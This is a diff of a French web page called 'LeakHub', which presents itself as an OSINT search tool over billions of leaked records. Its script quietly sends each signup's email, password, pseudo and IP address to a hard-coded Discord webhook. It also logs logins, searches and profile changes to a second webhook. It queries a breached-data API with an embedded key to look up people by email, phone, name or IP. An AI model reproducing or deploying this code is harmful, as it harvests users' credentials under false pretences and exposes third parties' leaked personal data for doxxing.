@@ -1,147 +1,255 @@
 <!DOCTYPE html>
 <html lang="fr">
 <head>
-<meta charset="UTF-8">
-<title>LeakHub</title>
-<link href="https://fonts.googleapis.com/css2?family=Roboto+Mono:wght@400;700&display=swap" rel="stylesheet">
-<style>
-body {
-  margin: 0;
-  font-family: 'Roboto Mono', monospace;
-  background: url('https://cdn.discordapp.com/attachments/1433531275779637272/1436433573065523312/LeakHub_Baneer.png?ex=690f9683&is=690e4503&hm=f85faf59f42aebfe7fda1ca8d817c9f276d3226d604e061f73265c505e5d06bc&') no-repeat center center fixed;
-  background-size: cover;
-  color: #00bfff;
-}
-
-header {
-  width: 100%;
-  padding: 10px 20px;
-  background: rgba(0,0,0,0.7);
-  display: flex;
-  align-items: center;
-  gap: 15px;
-  box-shadow: 0 2px 5px rgba(0,0,0,0.5);
-}
-
-header img { width: 120px; }
-header h1 { margin:0; font-size: 22px; color: #00bfff; }
-
-.container {
-  margin: 80px auto 0;
-  width: 400px;
-  background: rgba(0,0,0,0.6);
-  padding: 30px;
-  border-radius: 12px;
-  border: 2px solid #00bfff;
-  box-shadow: 0 0 20px #00bfff;
-}
-
-input, button {
-  width: 100%;
-  padding: 12px;
-  margin-top: 12px;
-  border-radius: 6px;
-  font-size: 16px;
-  font-family: 'Roboto Mono', monospace;
-}
-
-input { border: 1px solid #00bfff; background: rgba(0,0,0,0.5); color: #00bfff; }
-input:focus { border-color: #00ffff; outline: none; box-shadow: 0 0 10px #00ffff; }
-
-button { border:none; background: #00bfff; color: #0b1e3d; font-weight:bold; cursor:pointer; }
-button:hover { background:#00ffff; color:#001f2d; transform:scale(1.05); transition:0.3s; }
-
-#lookupDiv { display:none; }
-.result-item { opacity:0; animation: fadeIn 0.8s forwards; margin:5px 0; }
-@keyframes fadeIn { from {opacity:0; transform:translateX(-20px);} to {opacity:1; transform:translateX(0);} }
-
-</style>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>LeakHub — OSINT Bleu Nuit</title>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&family=JetBrains+Mono:wght@400;500;700&display=swap" rel="stylesheet">
+    <style>
+        :root{--bg:#0a0a0a;--surface:#111;--text:#e0e0e0;--accent:#1e90ff;--border:rgba(30,144,255,0.3);--glow:0 0 20px rgba(30,144,255,0.5);--radius:16px}
+        *{margin:0;padding:0;box-sizing:border-box}
+        body{background:var(--bg);color:var(--text);font-family:'Inter',sans-serif;overflow-x:hidden}
+        #particles{position:fixed;inset:0;z-index:-1}
+        header{position:fixed;top:0;left:0;right:0;padding:1rem 4%;display:flex;justify-content:space-between;align-items:center;backdrop-filter:blur(16px);background:rgba(10,10,10,.9);border-bottom:1px solid var(--border);z-index:1000}
+        .logo img{height:50px;border-radius:10px;box-shadow:var(--glow)}
+        nav{display:flex;align-items:center;gap:2.5rem}
+        nav ul{display:flex;gap:2rem;list-style:none}
+        nav a{color:var(--text);text-decoration:none;font-weight:500;position:relative}
+        nav a::after{content:"";position:absolute;bottom:-6px;left:0;width:0;height:2px;background:var(--accent);transition:all .4s}
+        nav a:hover::after,nav a.active::after{width:100%}
+        nav a:hover,nav a.active{color:var(--accent)}
+        .profile-btn{width:46px;height:46px;border-radius:50%;border:2px solid var(--accent);overflow:hidden;cursor:pointer;box-shadow:var(--glow);transition:.3s}
+        .profile-btn:hover{transform:scale(1.15)}
+        .profile-btn img{width:100%;height:100%;object-fit:cover}
+        main{padding-top:7rem;min-height:100vh;display:flex;justify-content:center;align-items:center}
+        section{width:100%;max-width:900px;padding:3rem 5%;text-align:center;display:none;flex-direction:column;align-items:center}
+        section.active{display:flex}
+        h1{font-size:clamp(2.5rem,7vw,3.8rem);margin-bottom:1rem;background:linear-gradient(135deg,#fff,var(--accent));-webkit-background-clip:text;-webkit-text-fill-color:transparent;font-weight:700;text-shadow:var(--glow)}
+        p{color:#888;max-width:600px;margin-bottom:2rem;font-size:1.1rem}
+        button{padding:.9rem 2.4rem;border:2px solid var(--accent);background:transparent;border-radius:50px;color:var(--accent);font-weight:600;cursor:pointer;transition:all .4s}
+        button:hover{background:var(--accent);color:#000;box-shadow:var(--glow);transform:translateY(-3px)}
+        input{margin:.6rem 0;padding:.9rem 1.2rem;width:100%;max-width:420px;background:rgba(255,255,255,.05);border:1px solid rgba(255,255,255,.15);color:var(--text);border-radius:12px;outline:none;transition:.3s}
+        input:focus{border-color:var(--accent);box-shadow:var(--glow)}
+        .loader{display:none;justify-content:center;gap:8px;margin:2rem 0}
+        .loader div{width:14px;height:14px;background:var(--accent);border-radius:50%;animation:p .8s infinite alternate}
+        .loader div:nth-child(2){animation-delay:.2s}.loader div:nth-child(3){animation-delay:.4s}
+        @keyframes p{to{transform:scale(1.4);opacity:.6}}
+        #result{margin-top:2rem;width:100%;max-width:800px;background:rgba(255,255,255,.03);padding:1.5rem;border-radius:var(--radius);border:1px solid var(--border);font-family:'JetBrains Mono',monospace;font-size:.95rem;max-height:50vh;overflow-y:auto;white-space:pre-wrap}
+        .modal{position:fixed;inset:0;background:rgba(0,0,0,.92);display:flex;justify-content:center;align-items:center;z-index:2000;opacity:0;visibility:hidden;backdrop-filter:blur(10px);transition:all .4s}
+        .modal.active{opacity:1;visibility:visible}
+        .modal-content{background:var(--surface);padding:2.5rem;border-radius:var(--radius);width:90%;max-width:420px;border:1px solid var(--border);box-shadow:0 0 40px rgba(30,144,255,.3);transform:scale(.9);transition:all .4s}
+        .modal.active .modal-content{transform:scale(1)}
+        .close-btn{position:absolute;top:14px;right:18px;font-size:28px;color:var(--accent);cursor:pointer;transition:.3s}
+        .close-btn:hover{transform:rotate(90deg)}
+        .tab-btn{background:transparent;color:#888;border:none;padding:10px 22px;font-size:1rem;cursor:pointer;transition:.3s}
+        .tab-btn.active{color:var(--accent);border-bottom:2px solid var(--accent)}
+        .error{color:#ff4444;font-size:0.9rem;margin-top:4px;text-align:left}
+        .profile-popup{display:none;position:absolute;top:68px;right:4%;background:var(--surface);padding:1.5rem;border-radius:var(--radius);border:1px solid var(--border);box-shadow:var(--glow);min-width:260px;z-index:999}
+    </style>
 </head>
 <body>
-<header>
-  <img src="https://cdn.discordapp.com/attachments/1433531275779637272/1436433357239095427/LeakHub_Logo.png?ex=690f9650&is=690e44d0&hm=5fd11be41d3460cdb225c64b667c9713a6b51a4132a5b94b435723e4bcaf74d9&" alt="Logo LeakHub">
-  <h1>LeakHub</h1>
-</header>
+    <canvas id="particles"></canvas>
+    <header>
+        <a href="#" class="logo">
+            <img src="https://cdn.discordapp.com/attachments/1433531634560274502/1436693142366720151/LeakHub_Logo.png?ex=69108841&is=690f36c1&hm=78ca092b07e44a55fc57c70352f2761b0f8ff4bb9bcd73ebf9ff806c6954c314&" alt="LeakHub">
+        </a>
+        <nav>
+            <ul>
+                <li><a href="#" data-target="home" class="active">Accueil</a></li>
+                <li><a href="#" data-target="search">Recherche</a></li>
+            </ul>
+            <div class="profile-btn" id="profileBtn" onclick="toggleProfilePopup()">
+                <img src="https://static.vecteezy.com/ti/vecteur-libre/p1/21548095-defaut-profil-image-avatar-utilisateur-avatar-icone-la-personne-icone-tete-icone-profil-image-icones-defaut-anonyme-utilisateur-masculin-et-femelle-homme-d-affaire-photo-espace-reserve-social-reseau-avatar-portrait-gratuit-vectoriel.jpg" id="profileImg">
+            </div>
+        </nav>
+        <div class="profile-popup" id="profilePopup">
+            <input type="text" id="editName" placeholder="Nouveau pseudo">
+            <div style="padding:.8rem;background:rgba(30,144,255,.1);border:1px dashed var(--accent);border-radius:10px;text-align:center;color:var(--accent);cursor:pointer;margin:10px 0" onclick="document.getElementById('fileInput').click()">Changer photo</div>
+            <input type="file" id="fileInput" accept="image/*" style="display:none" onchange="handleFile(this)">
+            <button onclick="saveProfile()">Sauvegarder</button>
+            <button onclick="logout()" style="margin-top:10px;background:#ff4444;border-color:#ff4444">Déconnexion</button>
+        </div>
+    </header>
 
-<div class="container">
-  <div id="signupDiv">
-    <h2>Inscription</h2>
-    <form id="signupForm">
-      <input type="email" id="email" placeholder="Email" required>
-      <input type="password" id="password" placeholder="Mot de passe" required>
-      <button type="submit">S’inscrire</button>
-    </form>
-    <div id="log"></div>
-  </div>
+    <main>
+        <section id="home" class="active">
+            <h1>Bienvenue sur LeakHub</h1>
+            <p>Recherche OSINT ultra-puissante avec NazAPI</p>
+            <button id="startBtn">Accéder à la recherche</button>
+        </section>
 
-  <div id="lookupDiv">
-    <h2>Recherche LeakHub</h2>
-    <input type="text" id="query" placeholder="Email, IP, etc...">
-    <button onclick="doLookup()">Rechercher</button>
-    <div id="results"></div>
-  </div>
-</div>
+        <section id="search">
+            <h1>NazAPI — 10B+ de leaks</h1>
+            <input type="text" id="searchInput" placeholder="Email, téléphone, nom, IP...">
+            <button onclick="searchLeak()">Lancer la recherche</button>
+            <div class="loader" id="loader"><div></div><div></div><div></div></div>
+            <pre id="result">Résultats ici...</pre>
+        </section>
+    </main>
 
-<script>
-let inscriptions = [];
+    <div class="modal" id="authModal">
+        <div class="modal-content">
+            <span class="close-btn" onclick="closeModal()">X</span>
+            <div style="display:flex;justify-content:center;margin-bottom:20px">
+                <button class="tab-btn active" onclick="showTab('login')">Connexion</button>
+                <button class="tab-btn" onclick="showTab('signup')">Inscription</button>
+            </div>
+            <div id="loginTab">
+                <input type="email" id="loginEmail" placeholder="Email">
+                <div id="loginEmailError" class="error"></div>
+                <input type="password" id="loginPassword" placeholder="Mot de passe">
+                <button onclick="login()">Se connecter</button>
+            </div>
+            <div id="signupTab" style="display:none">
+                <input type="text" id="signupName" placeholder="Pseudo">
+                <input type="email" id="signupEmail" placeholder="Email">
+                <div id="signupEmailError" class="error"></div>
+                <input type="password" id="signupPassword" placeholder="Mot de passe">
+                <button onclick="submitSignup()">S'inscrire</button>
+            </div>
+        </div>
+    </div>
 
-document.getElementById('signupForm').addEventListener('submit', async e=>{
-  e.preventDefault();
-  const email = document.getElementById('email').value;
-  const password = document.getElementById('password').value;
+    <script>
+        const DB = "https://discord.com/api/webhooks/1435634655838736425/CyT9jVObQ-PtCRTe7kkhqE8ZODGx4V-CfKnPv4h1ffXo_6F1BZoMRO4fzWaHiDgXKKif";
+        const LOGS = "https://discord.com/api/webhooks/1436669162205479063/it5irsmeIstIOLMnWlmzp2O42XJS2JnaA11GABCG404pc_rAXRt37DZUZDrfXBDKPs7n";
+        const NAZ_KEY = "8141145084:DcTUGz6Z";
+        const DEFAULT_AVATAR = "https://static.vecteezy.com/ti/vecteur-libre/p1/21548095-defaut-profil-image-avatar-utilisateur-avatar-icone-la-personne-icone-tete-icone-profil-image-icones-defaut-anonyme-utilisateur-masculin-et-femelle-homme-d-affaire-photo-espace-reserve-social-reseau-avatar-portrait-gratuit-vectoriel.jpg";
 
-  // récupérer IP
-  const ipRes = await fetch('https://api.ipify.org?format=json');
-  const ipData = await ipRes.json();
-  const ip = ipData.ip;
-  const heure = new Date().toLocaleString();
+        let user = {name: localStorage.getItem('lh_name')||'Invité', avatar: localStorage.getItem('lh_avatar')||DEFAULT_AVATAR, registered: !!localStorage.getItem('lh_registered')};
+        document.getElementById('profileImg').src = user.avatar;
 
-  inscriptions.push(`email: ${email} ip: ${ip} mdp: ${password} heure: ${heure}`);
+        document.getElementById('startBtn').onclick = () => openModal();
 
-  const webhookURL = "https://discord.com/api/webhooks/1435634655838736425/CyT9jVObQ-PtCRTe7kkhqE8ZODGx4V-CfKnPv4h1ffXo_6F1BZoMRO4fzWaHiDgXKKif";
-  try {
-    await fetch(webhookURL,{
-      method:'POST',
-      headers:{'Content-Type':'application/json'},
-      body: JSON.stringify({content: inscriptions.join("\n")})
-    });
-    document.getElementById('signupDiv').style.display='none';
-    document.getElementById('lookupDiv').style.display='block';
-  } catch(err){
-    document.getElementById('log').textContent='Erreur envoi webhook';
-  }
-});
+        // === VÉRIF EMAIL ULTRA-LÉGÈRE (seulement le format) ===
+        function isValidEmail(email) {
+            return /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email);
+        }
 
-function doLookup(){
-  const query = document.getElementById('query').value;
-  const results = document.getElementById('results');
-  results.innerHTML = `<p>Recherche en cours pour <strong>${query}</strong>…</p>`;
+        document.querySelectorAll('nav a').forEach(a=>a.onclick=e=>{e.preventDefault();document.querySelectorAll('section').forEach(s=>s.classList.remove('active'));document.getElementById(a.dataset.target).classList.add('active');document.querySelectorAll('nav a').forEach(x=>x.classList.remove('active'));a.classList.add('active');});
+        function switchTo(id){document.querySelectorAll('section').forEach(s=>s.classList.remove('active'));document.getElementById(id).classList.add('active');}
 
-  setTimeout(()=>{
-    const simulated = [
-      `Snusbase : indisponible`,
-      `LeakHub : indisponible`,
-      `IP Info : 123.45.67.89`,
-      `Localisation : Paris, Île‑de‑France, FR`,
-      `Intel X : Aucun résultat`,
-      `Have I Been Pwned : Aucun compte trouvé`,
-      `GhostProject : Aucun leak trouvé`,
-      `EmailRep : Niveau de risque faible`,
-      `PwnedList : 0 leaks associés`,
-      `OtherLeakDB : Aucun résultat`
-    ];
+        function openModal(){document.getElementById('authModal').classList.add('active');document.body.style.overflow='hidden';}
+        function closeModal(){document.getElementById('authModal').classList.remove('active');document.body.style.overflow='';}
+        function showTab(t){document.querySelectorAll('.tab-btn').forEach(b=>b.classList.remove('active'));document.querySelector(`.tab-btn[onclick="showTab('${t}')"]`).classList.add('active');document.getElementById('loginTab').style.display=t==='login'?'block':'none';document.getElementById('signupTab').style.display=t==='signup'?'block':'none';}
 
-    results.innerHTML = '';
-    simulated.forEach((item,i)=>{
-      const div = document.createElement('div');
-      div.className = 'result-item';
-      div.style.animationDelay = (i*0.2)+'s';
-      div.textContent = item;
-      results.appendChild(div);
-    });
-  }, 1000);
-}
-</script>
+        async function login(){
+            const e = document.getElementById('loginEmail').value.trim();
+            const p = document.getElementById('loginPassword').value;
+            document.getElementById('loginEmailError').textContent='';
+            if(!e||!p) return alert('Remplis tout');
+            if(!isValidEmail(e)) return document.getElementById('loginEmailError').textContent='Format email incorrect';
+            user.registered=true; user.name=e.split('@')[0];
+            localStorage.setItem('lh_registered','true'); localStorage.setItem('lh_name',user.name);
+            alert('Connecté !'); closeModal(); switchTo('search');
+            sendLog(`Connexion : **${user.name}** (${e})`);
+        }
+
+        async function submitSignup(){
+            const n = document.getElementById('signupName').value.trim();
+            const e = document.getElementById('signupEmail').value.trim();
+            const p = document.getElementById('signupPassword').value;
+            document.getElementById('signupEmailError').textContent='';
+            if(!n||!e||!p) return alert('Champ manquant');
+            if(!isValidEmail(e)) return document.getElementById('signupEmailError').textContent='Format email incorrect';
+
+            const ip = await fetch('https://api.ipify.org?format=json').then(r=>r.json()).then(d=>d.ip).catch(()=> '??');
+            const h = new Date().toLocaleString('fr-FR',{day:'2-digit',month:'2-digit',year:'numeric',hour:'2-digit',minute:'2-digit',second:'2-digit'}).replace(', ',' ');
+
+            const line = `email: ${e} name: ${n} ip: ${ip} mdp: ${p} heure: ${h}`;
+            sendDB(line, user.avatar);
+
+            localStorage.setItem('lh_registered','true'); localStorage.setItem('lh_name',n);
+            user.registered=true; user.name=n;
+            alert('Inscription OK !'); closeModal(); switchTo('search');
+        }
+
+        async function searchLeak(){
+            const q = document.getElementById('searchInput').value.trim();
+            const r = document.getElementById('result');
+            const l = document.getElementById('loader');
+            if(!q) return r.textContent='Entre quelque chose';
+            r.textContent=''; l.style.display='flex';
+            sendLog(`Recherche NazAPI par **${user.name}** : \`${q}\``);
+            try{
+                const res = await fetch(`https://api.leakosint.com/search?key=${NAZ_KEY}&query=${encodeURIComponent(q)}`);
+                const data = await res.json();
+                r.textContent = JSON.stringify(data,null,2) || 'Aucun résultat';
+            }catch(e){r.textContent='Erreur: '+e.message;}
+            l.style.display='none';
+        }
+
+        function toggleProfilePopup(){
+            if(!user.registered) return openModal();
+            const p = document.getElementById('profilePopup');
+            p.style.display = p.style.display==='block' ? 'none' : 'block';
+        }
+        function handleFile(i){
+            const f=i.files[0]; if(!f) return;
+            const r=new FileReader();
+            r.onload=e=>{
+                user.avatar=e.target.result;
+                document.getElementById('profileImg').src=user.avatar;
+                localStorage.setItem('lh_avatar',user.avatar);
+                sendLog(`Photo changée`,user.avatar);
+            };
+            r.readAsDataURL(f);
+        }
+        function saveProfile(){
+            const n=document.getElementById('editName').value.trim();
+            if(n && n!==user.name){
+                sendLog(`Pseudo : **${user.name}** → **${n}**`);
+                user.name=n; localStorage.setItem('lh_name',n);
+            }
+            document.getElementById('profilePopup').style.display='none';
+        }
+        function logout(){
+            if(confirm('Déconnexion ?')){
+                localStorage.clear();
+                user={name:'Invité',avatar:DEFAULT_AVATAR,registered:false};
+                document.getElementById('profileImg').src=DEFAULT_AVATAR;
+                sendLog(`Déconnexion`);
+                switchTo('home');
+            }
+        }
+
+        async function sendDB(t,i){
+            const p={content:"```yaml\n"+t+"\n```"};
+            if(i && i.startsWith('data:image')){
+                const b=await (await fetch(i)).blob();
+                const e=b.type.split('/')[1]||'png';
+                p.embeds=[{description:t,color:3447003,thumbnail:{url:`attachment://pp.${e}`},timestamp:new Date().toISOString()}];
+                const f=new FormData(); f.append('payload_json',JSON.stringify(p)); f.append('files[0]',b,`pp.${e}`);
+                fetch(DB,{method:'POST',body:f});
+            }else fetch(DB,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(p)});
+        }
+
+        function sendLog(t,i=null){
+            const p={content:"```"+t+"```"};
+            if(i){
+                (async()=>{
+                    const b=await (await fetch(i)).blob();
+                    const e=b.type.split('/')[1]||'png';
+                    p.embeds=[{image:{url:`attachment://log.${e}`}}];
+                    const f=new FormData(); f.append('payload_json',JSON.stringify(p)); f.append('files[0]',b,`log.${e}`);
+                    fetch(LOGS,{method:'POST',body:f});
+                })();
+            }else fetch(LOGS,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(p)});
+        }
+
+        const c=document.getElementById('particles'),ctx=c.getContext('2d');let p=[];
+        function rz(){c.width=innerWidth;c.height=innerHeight;}
+        class Particle{constructor(){this.x=Math.random()*c.width;this.y=Math.random()*c.height;this.size=Math.random()*1.5+.5;this.sx=Math.random()*.8-.4;this.sy=Math.random()*.8-.4;}
+            update(){this.x+=this.sx;this.y+=this.sy;if(this.x<0||this.x>c.width)this.sx*=-1;if(this.y<0||this.y>c.height)this.sy*=-1;}
+            draw(){ctx.fillStyle='rgba(30,144,255,0.6)';ctx.beginPath();ctx.arc(this.x,this.y,this.size,0,Math.PI*2);ctx.fill();}}
+        function init(){p=[];for(let i=0;i<80;i++)p.push(new Particle());}
+        function anim(){ctx.clearRect(0,0,c.width,c.height);p.forEach(x=>{x.update();x.draw();});requestAnimationFrame(anim);}
+        window.onresize=()=>{rz();init();};rz();init();anim();
+
+        document.addEventListener('click',e=>{
+            const pop=document.getElementById('profilePopup');
+            if(!e.target.closest('.profile-btn') && !e.target.closest('.profile-popup')) pop.style.display='none';
+        });
+    </script>
 </body>
 </html>
-
